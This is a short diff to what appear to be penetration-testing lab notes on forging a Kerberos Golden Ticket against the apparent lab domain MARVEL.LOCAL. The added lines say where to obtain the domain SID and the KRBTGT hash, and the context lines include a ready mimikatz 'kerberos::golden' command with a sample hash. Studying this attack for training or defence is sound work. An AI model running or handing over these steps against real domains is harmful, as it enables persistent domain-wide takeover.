@@ -57,6 +57,11 @@ SID of kbrtgt
 Domain name 
 impersonate-user
 
+Domain SID → can be found with whoami /user or Get-ADDomain.
+KRBTGT account hash → NTLM or AES (from secretsdump.py or DCSync).
+Domain name (FQDN) → e.g. MARVEL.LOCAL.
+Target user → usually Administrator.
+
 
 #mimikatz :
 kerberos::golden /User:zoro /domain:marvel.local /sid:S-1-5-21-3614020701-506922700-4184706594 /krbtgt:c90bf74688c024687385328ca2616f5b /id:500 /ptt
